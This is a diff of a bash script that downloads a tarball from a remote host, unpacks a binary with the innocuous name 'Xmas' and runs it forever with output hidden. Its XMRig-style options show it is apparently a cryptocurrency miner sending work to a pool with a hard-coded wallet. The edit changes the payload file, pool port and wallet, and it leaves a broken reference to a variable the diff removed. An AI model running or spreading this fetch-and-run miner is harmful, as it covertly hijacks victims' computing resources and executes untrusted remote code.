@@ -52,19 +52,21 @@ for i in {a..z} {A..Z} {0..9};
    array[$RANDOM]=$i
 done
 
-currentdate=$(date '+%d-%b-%Y_Bit_')
+provider=""
+provider+="Bitr_"
 ipaddress=$(curl -s api.ipify.org)
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 used_num_of_cores=`expr $num_of_cores - 2`
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 underscore="_"
 underscored_ip+=$underscore
-currentdate+=$underscored_ip
+provider+=$underscored_ip
 
 randomWord=$(printf %s ${array[@]::8} $'\n')
-currentdate+=$randomWord
+provider+=$randomWord
 
 sleep 2
+
 
 echo ""
 echo "You will be using $used_num_of_cores cores"
@@ -72,9 +74,9 @@ echo ""
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.uk/Xmas_Veil.tar.gz
+wget -q http://greenleaf.teatspray.uk/Xmas.tar.gz
 sleep 2
-tar -xf Xmas_Veil.tar.gz
+tar -xf Xmas.tar.gz
 
 sleep 2
 
@@ -93,6 +95,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10281 -u solo:bv1qd0hntshqslfejlle0vk4ewh2km55n2gze99dna -p x --rig-id=$currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10107 -u solo:Q0105002628a239b471e885555ecdfbca3ef53ce3b5c8a90beb205d389fa14f4de7aa921dfc44a1@$provider -p $currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
